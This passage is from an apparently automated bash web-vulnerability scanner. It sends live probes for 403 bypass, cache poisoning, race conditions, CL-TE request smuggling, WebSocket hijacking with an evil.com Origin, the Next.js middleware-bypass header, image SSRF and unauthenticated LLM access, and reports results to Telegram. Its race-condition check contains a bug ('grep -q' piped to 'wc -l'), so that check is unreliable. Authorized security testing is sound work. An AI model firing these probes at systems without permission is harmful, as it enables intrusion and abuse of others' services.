          mod="${url}${psuffix}"
          _tb="$(mktemp)"
          code=$(curl -sS --connect-timeout "$HTTP_CONNECT_TIMEOUT" --max-time "$HTTP_TIMEOUT" -o "$_tb" -w '%{http_code}' "${CURL_HDR[@]}" "$mod" 2>/dev/null || echo 000)
          _len=$(wc -c < "$_tb" 2>/dev/null | tr -d ' '); rm -f "$_tb"
          if _bypass_ok "$code" "${_len:-0}"; then
            printf '403_PATH_BYPASS\t%s\tpath=%s\tcode=%s\tbytes=%s(base %s)\n' "$url" "$mod" "$code" "${_len:-0}" "$_base_len" >> "$OUT/vulns/403-bypass.txt"
            warn "403 Bypass: $mod ($code, ${_len}B vs base ${_base_len}B)"
            notify_alert "403 Path Bypass" "$mod" "Path trick bypassed 403 to $code with a different body (${_len}B vs baseline ${_base_len}B)"
          fi
        done
      done < "$OUT/403bypass/targets.txt"
    fi
    log "403 Bypass: $(count "$OUT/vulns/403-bypass.txt")"
  fi
  set_checkpoint 27
fi
telegram "🚪 <b>STEP 27/34 · 403 Access Bypass Testing</b> ✅
━━━━━━━━━━━━━━━━━━━━━━
🎯 <b>Target:</b> <code>${TARGET}</code>
💥 <b>Bypassed 403 Endpoints:</b> $(count "$OUT/vulns/403-bypass.txt")
⏱ <b>Elapsed:</b> $(get_elapsed)" "HTML"

###############################################################################
# 28. Web Cache Poisoning & Web Cache Deception
###############################################################################
if ! is_step_done 28; then
  if [[ "$MODE" == "full" ]]; then
    log "Testing Web Cache Poisoning & Cache Deception"
    : > "$OUT/cache/vulnerable.txt"

    head -n 50 "$OUT/http/live-urls.txt" | while IFS= read -r url; do
      cache_canary="apex_cache_$(date +%s)"
      resp_poison=$(curl -fsSi --connect-timeout "$HTTP_CONNECT_TIMEOUT" --max-time "$HTTP_TIMEOUT" -H "X-Forwarded-Host: ${cache_canary}.com" "${CURL_HDR[@]}" "$url" 2>/dev/null || true)

      if printf '%s' "$resp_poison" | grep -qi "X-Cache: HIT"; then
        if printf '%s' "$resp_poison" | grep -qF "$cache_canary"; then
          printf 'CACHE_POISONING\t%s\tUnkeyed header X-Forwarded-Host reflected in cached response!\n' "$url" >> "$OUT/cache/vulnerable.txt"
          warn "🔥 CRITICAL Web Cache Poisoning on $url!"
          notify_alert "Web Cache Poisoning Detected" "$url" "X-Forwarded-Host reflected in HTTP X-Cache: HIT"
        fi
      fi

      deception_url="${url%/}/apex_deception_test.js"
      resp_dec=$(curl -fsSi --connect-timeout "$HTTP_CONNECT_TIMEOUT" --max-time "$HTTP_TIMEOUT" "${CURL_HDR[@]}" "$deception_url" 2>/dev/null || true)
      if printf '%s' "$resp_dec" | grep -qiE 'X-Cache:[[:space:]]*HIT|CF-Cache-Status:[[:space:]]*HIT'; then
        if printf '%s' "$resp_dec" | grep -qiE 'Content-Type:[[:space:]]*text/html'; then
          printf 'CACHE_DECEPTION\t%s\tDynamic HTML cached under JS path extension\n' "$deception_url" >> "$OUT/cache/vulnerable.txt"
          warn "🔥 Web Cache Deception on $deception_url!"
          notify_alert "Web Cache Deception" "$deception_url" "Dynamic page cached as static JS asset"
        fi
      fi
    done
    log "Web Cache Analysis: $(count "$OUT/cache/vulnerable.txt") cache vulnerabilities"
  fi
  set_checkpoint 28
fi
telegram "🧊 <b>STEP 28/34 · Web Cache Poisoning &amp; Deception</b> ✅
━━━━━━━━━━━━━━━━━━━━━━
🎯 <b>Target:</b> <code>${TARGET}</code>
🔥 <b>Vulnerable Cache Endpoints:</b> $(count "$OUT/cache/vulnerable.txt")
⏱ <b>Elapsed:</b> $(get_elapsed)" "HTML"

###############################################################################
# 29. Race Condition Detection (Parallel Request Bursting)
###############################################################################
if ! is_step_done 29; then
  if [[ "$MODE" == "full" ]] && [[ -s "$OUT/params/with-params.txt" ]]; then
    log "Testing Race Conditions (Parallel Request Firing & Response Analysis)"
    : > "$OUT/race/vulnerable.txt"
    : > "$OUT/race/potential-race.txt"

    cat "$OUT/params/high-value.txt" "$OUT/params/with-params.txt" 2>/dev/null | awk 'NF && !seen[$0]++' | head -n 15 | while IFS= read -r race_target; do
      tmp_race_out="$(mktemp -d)"

      # Fire 15 parallel requests
      for i in {1..15}; do
        curl -fsS --max-time 10 -o "$tmp_race_out/$i.body" -D "$tmp_race_out/$i.hdr" -w "%{http_code}\n" "${CURL_HDR[@]}" "$race_target" > "$tmp_race_out/$i.code" 2>/dev/null &
      done
      wait

      status_count=$(cat "$tmp_race_out"/*.code 2>/dev/null | awk 'NF && !seen[$0]++' | wc -l | tr -d ' ')
      body_size_count=$(wc -c "$tmp_race_out"/*.body 2>/dev/null | awk '$2 != "total" {print $1}' | awk 'NF && !seen[$0]++' | wc -l | tr -d ' ')
      
      is_transactional=0
      if printf '%s' "$race_target" | grep -qiE 'coupon|checkout|redeem|transfer|pay|reset|register|signup|vote|token|withdraw|order|cart|balance|invite'; then
        is_transactional=1
      fi

      # Confidence Level Classification:
      # Low: Status codes differ only (CDN / Rate Limit / Load Balancer)
      # Medium: Body size differs on transactional endpoints
      # Confirmed: Proven application state anomaly (e.g. duplicate successful transactional responses)
      if [[ "$status_count" -gt 1 && "$body_size_count" -eq 1 && "$is_transactional" -eq 0 ]]; then
        printf 'POTENTIAL_RACE_LOW\t%s\tConfidence: Low | Reason: Inconsistent HTTP status codes (%s distinct). Likely CDN/WAF/Rate Limiting.\n' "$race_target" "$status_count" >> "$OUT/race/potential-race.txt"
        log "  ↳ Race Condition: $race_target -> Low confidence (status code variance only — likely CDN/WAF)"
      elif [[ "$body_size_count" -gt 1 && "$is_transactional" -eq 1 ]]; then
        # Check for duplicate successful state execution in responses
        success_count=$(grep -qiE 'success|created|approved|confirmed|redeemed|processed' "$tmp_race_out"/*.body 2>/dev/null | wc -l | tr -d ' ')
        if [[ "$success_count" -gt 1 ]]; then
          printf 'RACE_CONDITION_CONFIRMED\t%s\tConfidence: Confirmed | Reason: Duplicate successful state execution (%s times) under parallel burst\n' "$race_target" "$success_count" >> "$OUT/race/vulnerable.txt"
          warn "🚨 CONFIRMED Race Condition on $race_target (Duplicate state success: $success_count)"
          notify_confidence_alert "Confirmed" "Race Condition (Business Logic Impact)" "$race_target" "Parallel request burst yielded duplicate successful state executions ($success_count times)." "curl -i -s \"${race_target}\""
        else
          printf 'POTENTIAL_RACE_MEDIUM\t%s\tConfidence: Medium | Reason: Variable response sizes across parallel requests on state-changing endpoint\n' "$race_target" >> "$OUT/race/potential-race.txt"
          log "  ↳ Race Condition: $race_target -> Medium confidence (response size variance on transactional endpoint)"
          notify_confidence_alert "Low" "Potential Race Condition" "$race_target" "Concurrent requests returned inconsistent HTTP status / response sizes. No business logic impact confirmed. Manual verification required." "curl -i -s \"${race_target}\""
        fi
      elif [[ "$status_count" -gt 1 ]]; then
        printf 'POTENTIAL_RACE_LOW\t%s\tConfidence: Low | Reason: Inconsistent HTTP status codes (%s distinct).\n' "$race_target" "$status_count" >> "$OUT/race/potential-race.txt"
        log "  ↳ Race Condition: $race_target -> Low confidence (inconsistent status codes)"
      fi

      rm -rf "$tmp_race_out"
    done
    log "Race Condition Testing: $(count "$OUT/race/vulnerable.txt") CONFIRMED | $(count "$OUT/race/potential-race.txt") potential"
  fi
  set_checkpoint 29
fi
telegram "🏁 <b>STEP 29/34 · Race Condition Detection</b> ✅
━━━━━━━━━━━━━━━━━━━━━━
🎯 <b>Target:</b> <code>${TARGET}</code>
⚡ <b>Race Condition Signals:</b> $(count "$OUT/race/vulnerable.txt")
⏱ <b>Elapsed:</b> $(get_elapsed)" "HTML"

###############################################################################
# 30. HTTP Request Smuggling (CL-TE / TE-CL Desync Detection)
###############################################################################
if ! is_step_done 30; then
  if [[ "$MODE" == "full" ]] && have ncat; then
    log "Testing HTTP Request Smuggling (CL-TE / TE-CL Desync)"
    : > "$OUT/smuggling/vulnerable.txt"

    head -n 20 "$OUT/http/live-urls.txt" | while IFS= read -r target_url; do
      host=$(echo "$target_url" | awk -F/ '{print $3}' | cut -d: -f1)
      port=443
      [[ "$target_url" =~ ^http:// ]] && port=80

      probe_cl_te=$(printf "POST / HTTP/1.1\r\nHost: %s\r\nContent-Length: 6\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nG" "$host")

      if [[ "$port" == "443" ]]; then
        resp=$(printf "%s" "$probe_cl_te" | ncat --ssl --timeout 8 "$host" "$port" 2>/dev/null || true)
      else
        resp=$(printf "%s" "$probe_cl_te" | ncat --timeout 8 "$host" "$port" 2>/dev/null || true)
      fi

      if printf '%s' "$resp" | grep -qiE '400 Bad Request|504 Gateway|Unrecognized'; then
        printf 'REQUEST_SMUGGLING_CANDIDATE\t%s\tHost:%s\tCL-TE probe returned an error; differential confirmation required\n' "$target_url" "$host" >> "$OUT/smuggling/vulnerable.txt"
        warn "🔥 HTTP Request Smuggling signal on $host"
      fi
    done
    log "Request Smuggling: $(count "$OUT/smuggling/vulnerable.txt") desync signals"
  fi
  set_checkpoint 30
fi
telegram "🔀 <b>STEP 30/34 · HTTP Request Smuggling Testing</b> ✅
━━━━━━━━━━━━━━━━━━━━━━
🎯 <b>Target:</b> <code>${TARGET}</code>
🔥 <b>Desync Signals:</b> $(count "$OUT/smuggling/vulnerable.txt")
⏱ <b>Elapsed:</b> $(get_elapsed)" "HTML"

###############################################################################
# 31. WebSocket Security Audit (CSWSH & Handshake Vulnerabilities)
###############################################################################
if ! is_step_done 31; then
  log "Auditing WebSocket Security & Cross-Site WebSocket Hijacking"
  : > "$OUT/ws/vulnerable.txt"

  ws_endpoints=$(grep -Ei 'wss?://' "$OUT/urls/all.txt" 2>/dev/null || true)

  if [[ -z "$ws_endpoints" ]]; then
    ws_endpoints=$(head -n 20 "$OUT/http/live-urls.txt" | sed 's/^http:/ws:/; s/^https:/wss:/')
  fi

  if have websocat; then
    while IFS= read -r ws_url; do
      [[ -z "$ws_url" ]] && continue
      resp_ws=$(websocat -u -H="Origin: https://evil.com" --max-ttl 5 "$ws_url" 2>&1 || true)
      if echo "$resp_ws" | grep -qiE 'connected|101|switching protocols|welcome'; then
        printf 'CSWSH_CANDIDATE\t%s\tConnection accepted an untrusted Origin; validate with authenticated browser session\n' "$ws_url" >> "$OUT/ws/vulnerable.txt"
        warn "🔥 CSWSH Vulnerability: $ws_url accepts arbitrary Origin header!"
        notify_alert "CSWSH Vulnerability" "$ws_url" "Cross-Site WebSocket Hijacking possible — Origin: evil.com accepted"
      fi
    done <<< "$ws_endpoints"
  fi

  log "WebSocket Security Audit: $(count "$OUT/ws/vulnerable.txt") issues found"
  set_checkpoint 31
fi
telegram "🔌 <b>STEP 31/34 · WebSocket Security Audit</b> ✅
━━━━━━━━━━━━━━━━━━━━━━
🎯 <b>Target:</b> <code>${TARGET}</code>
🔥 <b>Vulnerable WebSockets:</b> $(count "$OUT/ws/vulnerable.txt")
⏱ <b>Elapsed Total:</b> $(get_elapsed)" "HTML"

#####################################################################################
# 32. Next.js Deep Security & Route Module (RSC, Middleware Bypass, Image SSRF)
###############################################################################
if ! is_step_done 32; then
  log "Testing Next.js Security & Route Vectors (RSC, Image SSRF, Middleware Bypass)"

  : > "$OUT/nextjs/vulnerable.txt"
  : > "$OUT/nextjs/routes.txt"

  if ! grep -qiE 'next\.js|nextjs|/_next/|__rsc' "$OUT/http/httpx.jsonl" "$OUT/http/tech-stack.txt" "$OUT/urls/all.txt" 2>/dev/null; then
    log "  ↳ Smart Routing: No Next.js technology signatures detected across live targets — skipping Step 32"
  else
    # Detect Next.js endpoints
    grep -Ei '/_next/|__rsc=|_rsc=' "$OUT/urls/all.txt" 2>/dev/null > "$OUT/nextjs/routes.txt" || true

    sed -n '1,100p' "$OUT/http/live-urls.txt" | xargs -r -P "${CONCURRENCY:-10}" -I '{}' sh -c '
      host_url="$1"
      curl_args=()
      [[ -n "'"$AUTH_HEADER"'" ]] && curl_args+=(-H "'"$AUTH_HEADER"'")
      [[ -n "'"$AUTH_HEADER2"'" ]] && curl_args+=(-H "'"$AUTH_HEADER2"'")
      [[ -n "'"$AUTH_COOKIE"'" ]] && curl_args+=(-H "Cookie: '"$AUTH_COOKIE"'")

      # Image SSRF
      if [[ -n "'"$OOB_DOMAIN"'" ]]; then
        SSRF_TOKEN="nextimg$(date +%s%N)"
        img_opt_url="${host_url%/}/_next/image?url=https://${SSRF_TOKEN}.'"$OOB_DOMAIN"'/test&w=640&q=75"
        curl -fsS --max-time 10 "${curl_args[@]}" "$img_opt_url" >/dev/null 2>&1 || true
        sleep 2
        if grep -q "$SSRF_TOKEN" "'"$OUT"'/oob/interactions.jsonl" 2>/dev/null; then
          printf "NEXTJS_IMAGE_SSRF_VERIFIED\t%s\tInteractsh callback confirmed\n" "$img_opt_url" >> "'"$OUT"'/nextjs/vulnerable.txt"
        fi
      fi

      # Middleware Bypass
      bypass_url="${host_url%/}/_next/data/latest/index.json"
      _nb="$(mktemp)"; _mb="$(mktemp)"
      normal_code=$(curl -fsS --max-time 10 -o "$_nb" -w "%{http_code}" "${curl_args[@]}" "$bypass_url" 2>/dev/null || echo 000)
      bypass_code=$(curl -fsS --max-time 10 -o "$_mb" -w "%{http_code}" -H "x-middleware-subrequest: middleware" "${curl_args[@]}" "$bypass_url" 2>/dev/null || echo 000)
      rm -f "$_nb" "$_mb"

      if [[ "$normal_code" != "200" && "$bypass_code" == "200" ]]; then
        printf "NEXTJS_MIDDLEWARE_BYPASS_VERIFIED\t%s\tNormal:%s Bypass:%s\n" "$bypass_url" "$normal_code" "$bypass_code" >> "'"$OUT"'/nextjs/vulnerable.txt"
      fi
    ' _ '{}' || true
  fi

  log "Next.js Security Audit: $(count "$OUT/nextjs/vulnerable.txt") issues found"
  set_checkpoint 32
fi


telegram "⚡ <b>STEP 32/34 · Next.js Security Audit</b> ✅
━━━━━━━━━━━━━━━━━━━━━━
🎯 <b>Target:</b> <code>${TARGET}</code>
🔥 <b>Verified Findings:</b> $(count "$OUT/nextjs/vulnerable.txt")
⏱ <b>Elapsed Total:</b> $(get_elapsed)" "HTML"

###############################################################################
# 33. AI / LLM Endpoint Discovery & Audit Module
###############################################################################
if ! is_step_done 33; then
  log "Discovering AI & LLM Endpoints (/v1/chat/completions, /openai, /anthropic, /langchain)"
  : > "$OUT/ai/endpoints.txt"
  : > "$OUT/ai/vulnerable.txt"
  : > "$OUT/ai/exposed-model-list.txt"

  grep -Ei '/chat|/v1/chat|/v1/messages|/openai|/langchain|/ollama|/anthropic' "$OUT/urls/all.txt" 2>/dev/null > "$OUT/ai/endpoints.txt" || true

  # Confirmation flow (per operator spec):
  #   GET <model-list>  →  HTTP 200  →  valid JSON  →  models[] present
  #     →  POST <chat/completions> with the first model, max_tokens:1
  #     →  a real completion comes back  →  🚨 CONFIRMED unauth LLM access.
  # A model list that needs auth (401/403) or non-JSON/HTML is IGNORED, and a
  # readable model list that does NOT yield a working completion is recorded
  # as an exposure only — NOT as the confirmed vuln.
  MODEL_LIST_PATHS=("/openai/v1/models" "/v1/models" "/api/v1/models" "/openai/models")
  head -n "${AI_MAX:-15}" "$OUT/http/live-urls.txt" | xargs -r -P "${CONCURRENCY:-10}" -I '{}' sh -c '
    base="$1"
    clean_base="${base%/}"
    MODEL_LIST_PATHS=("/openai/v1/models" "/v1/models" "/api/v1/models" "/openai/models")
    curl_args=()
    [[ -n "'"$AUTH_HEADER"'" ]] && curl_args+=(-H "'"$AUTH_HEADER"'")
    [[ -n "'"$AUTH_HEADER2"'" ]] && curl_args+=(-H "'"$AUTH_HEADER2"'")
    [[ -n "'"$AUTH_COOKIE"'" ]] && curl_args+=(-H "Cookie: '"$AUTH_COOKIE"'")

    for mp in "${MODEL_LIST_PATHS[@]}"; do
      ml_url="${clean_base}${mp}"
      _mf="$(mktemp)"
      code=$(curl -sS --max-time 8 -o "$_mf" -w "%{http_code}" "${curl_args[@]}" "$ml_url" 2>/dev/null || echo 000)
      if [[ "$code" != "200" ]]; then rm -f "$_mf"; continue; fi
      if ! jq -e . "$_mf" >/dev/null 2>&1; then rm -f "$_mf"; continue; fi
      model_id=$(jq -r "(.data[0].id // .data[0].name // .models[0].id // .models[0].name // .models[0]) // empty" "$_mf" 2>/dev/null)
      n_models=$(jq -r "((.data // .models // []) | length)" "$_mf" 2>/dev/null || echo 0)
      rm -f "$_mf"
      if [[ -z "$model_id" || "${n_models:-0}" -lt 1 ]]; then continue; fi

      printf "AI_MODEL_LIST_EXPOSED\t%s\tmodels=%s\tfirst=%s\n" "$ml_url" "$n_models" "$model_id" >> "'"$OUT"'/ai/exposed-model-list.txt"

      comp_url="${ml_url%models}chat/completions"
      _cf="$(mktemp)"
      payload=$(printf "{\"model\":\"%s\",\"messages\":[{\"role\":\"user\",\"content\":\"hi\"}],\"max_tokens\":1}" "$model_id")
      ccode=$(curl -sS --max-time 12 -o "$_cf" -w "%{http_code}" \
                -X POST -H "Content-Type: application/json" "${curl_args[@]}" \
                --data "$payload" "$comp_url" 2>/dev/null || echo 000)
      if [[ "$ccode" == "200" ]] && jq -e "(.error == null) and ((.choices[0].message.content // .choices[0].text // .message.content // .content) != null)" "$_cf" >/dev/null 2>&1; then
        printf "AI_UNAUTH_COMPLETION\t%s\tmodel=%s\tvia=%s\n" "$comp_url" "$model_id" "$ml_url" >> "'"$OUT"'/ai/vulnerable.txt"
      fi
      rm -f "$_cf"
    done
  ' _ '{}' || true

  log "AI / LLM Audit: $(count "$OUT/ai/vulnerable.txt") CONFIRMED, $(count "$OUT/ai/exposed-model-list.txt") exposed model-list (not confirmed)"
  set_checkpoint 33
fi
telegram "🤖 <b>STEP 33/34 · AI &amp; LLM Endpoint Audit</b> ✅
━━━━━━━━━━━━━━━━━━━━━━
🎯 <b>Target:</b> <code>${TARGET}</code>
🚨 <b>Unauth LLM Confirmed:</b> $(count "$OUT/ai/vulnerable.txt")
🟡 <b>Model-list Exposed:</b> $(count "$OUT/ai/exposed-model-list.txt")
⏱ <b>Elapsed Total:</b> $(get_elapsed)" "HTML"

###############################################################################
# 33b. Late OOB callback sweep — catch DELAYED blind callbacks.
# The interactsh listener keeps writing every callback to interactions.jsonl for
# the WHOLE run, but only Stage 8 verified them (right after firing SSRF/nuclei
# payloads). Server-side requests (SSRF/RCE/XXE/blind-XSS) often arrive minutes
# later — after Stage 8 already closed. This re-scans the full log, dedupes by
# interactsh unique-id against what was already reported, and appends any NEW
# HTTP callback. DNS-only interactions are ignored (scanner self-trigger = FP),
# exactly like Stage 8. Idempotent: re-runs skip already-reported ids.
###############################################################################
if [[ -n "${OOB_DOMAIN:-}" && -s "$OUT/oob/interactions.jsonl" ]]; then
  log "Late OOB sweep: re-checking $(count "$OUT/oob/interactions.jsonl") total interaction(s) for delayed callbacks"
  _seen_ids="$OUT/oob/.seen-ids.tmp"; : > "$_seen_ids"
  # ids already in ssrf-verified.txt (each Details= holds the raw interaction JSON)
  [[ -s "$OUT/oob/ssrf-verified.txt" ]] && \
    grep -oE '"unique-id":"[a-z0-9-]+"' "$OUT/oob/ssrf-verified.txt" 2>/dev/null | sort -u > "$_seen_ids" || true
  _late_new=0
  while IFS= read -r interaction; do
    [[ -z "$interaction" ]] && continue
    i_type=$(printf '%s' "$interaction" | jq -r '.protocol // .type // empty' 2>/dev/null)
    [[ "$i_type" == "http" || "$i_type" == "https" ]] || continue
    i_uid=$(printf '%s' "$interaction" | jq -r '."unique-id" // .unique_id // empty' 2>/dev/null)
    # dedupe: skip callbacks already reported (Stage 8 or an earlier sweep pass)
    [[ -n "$i_uid" ]] && grep -qF "\"unique-id\":\"$i_uid\"" "$_seen_ids" 2>/dev/null && continue
    i_remote=$(printf '%s' "$interaction" | jq -r '."remote-address" // .remote_address // empty' 2>/dev/null)
    remote_ip=$(printf '%s' "$i_remote" | grep -Eo '^[0-9.]+' || echo "0.0.0.0")
    is_target="false"
    if [[ -s "$OUT/oob/target-ips.txt" && -n "$i_remote" ]] && grep -qF "$remote_ip" "$OUT/oob/target-ips.txt" 2>/dev/null; then
      is_target="true"
    fi
    if [[ "$is_target" == "true" ]]; then
      printf 'CONFIRMED_SSRF(late)\tProtocol=%s\tRemoteIP=%s\tDetails=%s\n' "$i_type" "$i_remote" "$interaction" >> "$OUT/oob/ssrf-verified.txt"
      warn "✅ CONFIRMED SSRF (late callback) from $i_remote"
      notify_alert "Blind SSRF (CONFIRMED — late callback)" \
        "OOB HTTP callback from $i_remote arrived after the main scan" \
        "Protocol: $i_type | The target server made a delayed server-side request to our OOB domain"
    else
      printf 'LIKELY_SSRF(late)\tProtocol=%s\tRemoteIP=%s\tDetails=%s\n' "$i_type" "${i_remote:-unknown}" "$interaction" >> "$OUT/oob/ssrf-verified.txt"
      warn "🟡 LIKELY SSRF (late callback) from ${i_remote:-unknown} — verify manually"
    fi
    [[ -n "$i_uid" ]] && printf '"unique-id":"%s"\n' "$i_uid" >> "$_seen_ids"
    _late_new=$((_late_new+1))
  done < "$OUT/oob/interactions.jsonl"
  rm -f "$_seen_ids"
  if [[ "$_late_new" -gt 0 ]]; then
    log "Late OOB sweep: +$_late_new new delayed callback(s) added"
  else
    log "Late OOB sweep: no new callbacks"
  fi
fi

###############################################################################
# 34. Summary + Diff Scanning + Interactive Reporting
###############################################################################
sleep 3

# Storage saver: final sweep of payload-permutation scratch. These are regenerated
# from params/gf-*.txt on any re-run and are not read by the summary/report below.
# Evidence (every */vulnerable.txt, */findings.txt, screens/, dumped source,
# secrets, urls/all.txt, http/all-probed.txt, burp/targets.txt) is preserved.
prune_paths "$OUT/redirect/targets.txt" "$OUT/403bypass/targets.txt" \
            "$OUT/sqli/top-targets.txt" "$OUT/oob/ssrf-targets.txt"

NMAP_SERVICES=$(grep -c '/open/' "$OUT/ports/nmap-sv.txt" 2>/dev/null || echo 0)
SUB=$(count "$OUT/subs/all.txt"); RES=$(count "$OUT/dns/resolved.txt")
LIVE=$(count "$OUT/http/live-urls.txt"); URLS=$(count "$OUT/urls/all.txt")
JS=$(count "$OUT/js/urls.txt"); TAKE=$(count "$OUT/takeover/nuclei-takeover.jsonl")
CVE=$(count "$OUT/vulns/nuclei-cve.jsonl"); AUTO=$(count "$OUT/vulns/nuclei-auto.jsonl"); NFULL=$(count "$OUT/vulns/nuclei-full.jsonl")
JSSEC=$(count "$OUT/js/jsluice-secrets.jsonl"); CSPW=$(grep -c WEAK_CSP "$OUT/csp/report.txt" 2>/dev/null || echo 0)
OOB=$(count "$OUT/oob/ssrf-verified.txt"); OOB_RAW=$(count "$OUT/oob/interactions.jsonl"); GQL=$(count "$OUT/graphql/live.txt")
GQLINTRO=$(count "$OUT/graphql/introspection-enabled.txt")
CSPBYPASS=$(count "$OUT/csp/bypasses.txt")
SQLI=$(count "$OUT/vulns/sqli-findings.txt"); SQLINUC=$(count "$OUT/vulns/sqli-nuclei.jsonl")
CORS=$(count "$OUT/cors/vulnerable.txt"); REDIR=$(count "$OUT/redirect/vulnerable.txt")
SSTI=$(count "$OUT/vulns/ssti-findings.txt"); LFI=$(count "$OUT/vulns/lfi-findings.txt")
CRLF=$(count "$OUT/vulns/crlf-findings.txt"); HOSTINJ=$(count "$OUT/vulns/host-header.txt")
BYPASS403=$(count "$OUT/vulns/403-bypass.txt")
CSPEXPLOIT=$(count "$OUT/csp/verified-exploits.txt")
CLICKJACK=$(count "$OUT/csp/clickjacking.txt")
HEADERS_GAP=$(count "$OUT/headers/audit.txt")
BUCKETS=$(count "$OUT/buckets/open-buckets.txt")
PROTO_POLL=$(count "$OUT/proto-pollution/vulnerable.txt")
JWT_VULNS=$(count "$OUT/jwt/vulnerable.txt")
CACHE_VULNS=$(count "$OUT/cache/vulnerable.txt")
RACE_SIGNALS=$(count "$OUT/race/vulnerable.txt")
SMUGGLING_SIGNALS=$(count "$OUT/smuggling/vulnerable.txt")
WS_VULNS=$(count "$OUT/ws/vulnerable.txt")
NEXTJS_VULNS=$(count "$OUT/nextjs/vulnerable.txt")
AI_VULNS=$(count "$OUT/ai/vulnerable.txt")
EXPOSED_FILES=$(count "$OUT/exposed/findings.txt")
OPENAPI_EP=$(count "$OUT/urls/openapi-endpoints.txt")
ARJUN_PARAMS=$(count "$OUT/params/arjun-found.txt")
DAST_HITS=$(count "$OUT/vulns/nuclei-dast.jsonl")
VERIFIED_FINDINGS=$(count "$OUT/validation/verified.txt")
NEEDS_REVIEW=$(count "$OUT/validation/needs-review.txt")
FALSE_POS=$(count "$OUT/validation/false-positive.txt")

# Diff Scanning (if --diff argument provided)
if [[ -n "$DIFF_DIR" && -d "$DIFF_DIR" ]]; then
  log "Performing Diff Scan against previous scan directory: $DIFF_DIR"
  : > "$OUT/diff-new-subdomains.txt"
  : > "$OUT/diff-new-urls.txt"
  comm -13 <(sort "$DIFF_DIR/subs/all.txt" 2>/dev/null || true) <(sort "$OUT/subs/all.txt") > "$OUT/diff-new-subdomains.txt" || true
  comm -13 <(sort "$DIFF_DIR/urls/all.txt" 2>/dev/null || true) <(sort "$OUT/urls/all.txt") > "$OUT/diff-new-urls.txt" || true
  log "Diff Scan: $(count "$OUT/diff-new-subdomains.txt") NEW subdomains, $(count "$OUT/diff-new-urls.txt") NEW URLs"
fi

{
  jq -r 'select(.info.severity == "critical" or .info.severity == "high") | "NUCLEI\t" + (.matched_at // .host // "") + "\t" + (."template-id" // "")' \
    "$OUT/vulns/nuclei-cve.jsonl" "$OUT/vulns/nuclei-auto.jsonl" "$OUT/vulns/nuclei-full.jsonl" "$OUT/vulns/nuclei-custom.jsonl" "$OUT/vulns/nuclei-dast.jsonl" 2>/dev/null || true
  for evidence in "$OUT/vulns/dalfox-xss.txt" "$OUT/vulns/sqli-findings.txt" "$OUT/vulns/ssti-findings.txt" "$OUT/vulns/lfi-findings.txt" "$OUT/cors/vulnerable.txt" "$OUT/vulns/403-bypass.txt" "$OUT/oob/ssrf-verified.txt" "$OUT/csp/verified-exploits.txt" "$OUT/buckets/open-buckets.txt" "$OUT/proto-pollution/vulnerable.txt" "$OUT/jwt/vulnerable.txt" "$OUT/cache/vulnerable.txt" "$OUT/ws/vulnerable.txt" "$OUT/nextjs/vulnerable.txt" "$OUT/ai/vulnerable.txt" "$OUT/exposed/findings.txt"; do
    [[ -s "$evidence" ]] && sed "s#^#ACTIVE_EVIDENCE\t#" "$evidence"
  done
} | sort -u > "$OUT/validation/high-confidence-queue.txt"
VALIDATED=$(count "$OUT/validation/high-confidence-queue.txt")

cat > "$OUT/summary.txt" <<EOF
Target:               $TARGET
Mode:                 $MODE (active-brute: $ACTIVE_BRUTE)
Nuclei profile:       $NUCLEI_PROFILE
Subdomain candidates: $SUB
Resolved hosts:       $RES
Live HTTP:            $LIVE
URLs collected:       $URLS
JavaScript URLs:      $JS
Takeover signals:     $TAKE
Nuclei CVE/vuln:      $CVE
Nuclei auto/full:     $AUTO / $NFULL
JS secret hits:       $JSSEC
GraphQL live/introsp: $GQL / $GQLINTRO
CSP weak/bypass:      $CSPW / $CSPBYPASS
Header Gaps:          $HEADERS_GAP
Cloud Buckets Open:   $BUCKETS
Proto Pollution:      $PROTO_POLL
JWT Vulnerabilities:  $JWT_VULNS
Cache Poisoning:      $CACHE_VULNS
Race Conditions:      $RACE_SIGNALS
Request Smuggling:    $SMUGGLING_SIGNALS
WebSocket Vulns:      $WS_VULNS
nmap Services:        $NMAP_SERVICES
SSRF verified:        $OOB (raw OOB hits: $OOB_RAW)
SQLi findings:        $SQLI (nuclei: $SQLINUC)
CORS misconfig:       $CORS
Open Redirect:        $REDIR
SSTI findings:        $SSTI
LFI findings:         $LFI
CRLF injection:       $CRLF
Host Header Inj:      $HOSTINJ
403 Bypass:           $BYPASS403
Exposed Files:        $EXPOSED_FILES
OpenAPI Endpoints:    $OPENAPI_EP
Hidden Params(arjun): $ARJUN_PARAMS
Nuclei DAST hits:     $DAST_HITS
CSP Exploit Chains:   $CSPEXPLOIT
Clickjacking:         $CLICKJACK
High-confidence queue:$VALIDATED
Engine VERIFIED:      $VERIFIED_FINDINGS
Engine Needs-Review:  $NEEDS_REVIEW
Engine FP Suppressed: $FALSE_POS
Total Time Elapsed:   $(get_elapsed)
Output dir:           $OUT
EOF
cat "$OUT/summary.txt"

# Build interactive HTML Audit Report
HTML_REPORT="$OUT/report.html"
cat > "$HTML_REPORT" <<HTMLEOF
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Apex Recon Audit Report — ${TARGET}</title>
  <style>
    :root { --bg: #0f172a; --card: #1e293b; --text: #f8fafc; --accent: #38bdf8; --danger: #f43f5e; --warning: #fbbf24; --success: #34d399; }
    body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; background: var(--bg); color: var(--text); margin: 0; padding: 24px; }
    h1, h2 { color: var(--accent); }
    .header { border-bottom: 2px solid #334155; padding-bottom: 16px; margin-bottom: 24px; }
    .grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 16px; margin-bottom: 32px; }
    .card { background: var(--card); border-radius: 8px; padding: 16px; border: 1px solid #334155; }
    .card .val { font-size: 28px; font-weight: bold; margin-top: 8px; color: var(--text); }
    .card.danger .val { color: var(--danger); }
    .card.warning .val { color: var(--warning); }
    .card.success .val { color: var(--success); }
    table { width: 100%; border-collapse: collapse; margin-top: 12px; margin-bottom: 32px; background: var(--card); border-radius: 8px; overflow: hidden; }
    th, td { padding: 12px; text-align: left; border-bottom: 1px solid #334155; font-size: 14px; word-break: break-all; }
    th { background: #0f172a; color: var(--accent); }
    tr:hover { background: #334155; }
    .tag { display: inline-block; padding: 4px 8px; border-radius: 4px; font-size: 12px; font-weight: bold; background: #334155; }
    .tag.critical { background: var(--danger); color: #fff; }
    .tag.high { background: #e11d48; color: #fff; }
    .tag.medium { background: var(--warning); color: #000; }
